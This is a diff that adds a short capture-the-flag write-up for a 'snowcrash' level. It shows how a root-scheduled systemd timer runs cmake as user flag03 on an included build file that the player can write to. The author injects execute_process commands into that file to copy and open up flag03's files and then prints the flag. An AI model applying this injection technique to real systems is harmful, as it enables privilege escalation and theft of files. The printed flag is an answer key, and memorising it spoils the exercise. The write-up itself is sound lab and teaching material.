@@ -1,0 +1,38 @@
+- $> id: we are in a new group (burbclave), and this burbclave is also a systemctl !
+- $> systemctl status burbclave.timer & burbclave.service.
+
+- Every 1minute, timer is running service, but what is service ?
+- $> systemctl cat burbclave.service 
+User=flag03
+ExecStart=/usr/bin/cmake -P /opt/snowcrash/level03/CMakeLists.txt
+- So we know that cmake is running /opt/snowcrash/level03/CMakeLists.txt
+as flag03 user :)
+- We can use this flag03 access to retrieve the flag!
+
+- FIRST what is containing Cmake.txt ?
+set(BURBCLAVE_SOCKET_PATH       "/var/run/burbclave.sock")
+set(BURBCLAVE_STATE_DIR         "/var/lib/burbclave")
+- We dont have access to .sock, but we do on /var/lib/burbclave
+
+- The most important here is this:
+include(${RESOLVED_BUILD_PATH}/build.cmake)
+- Because include() reading line by line and executing something !!!
+- So we can do "execute_process(COMMAND bin/bash -c getmetheflag)"
+
+- We already know that .sock is dead for us, so lets just try if /var/lib/burbclave can go somewhere.
+
+echo > /var/lib/burclave/staging/build.cmake "
+execute_process(COMMAND /bin/bash -c "ls -la /home/flag03/ > /home/flag03/res")
+execute_process(COMMAND /bin/bash -c "cp /home/flag03/res /tmp/res")
+execute_process(COMMAND /bin/bash -c "chmod 777 /tmp/res")
+
+- WAIT 60 SECONDS and POP:
+$> cat /tmp/res
+-rwxrwxrwx  1 flag03 flag03   29 Jun  9 19:03 .flag
+
+- Success ! now lets add 
+execute_process(COMMAND bash -c "cp /home/flag03/.flag /tmp/.flag")
+execute_process(COMMAND bash -c "chmod 777 /tmp/.flag")
+
+And POP:
+b209ea91ad7a5c2a0b0f4e195ca4
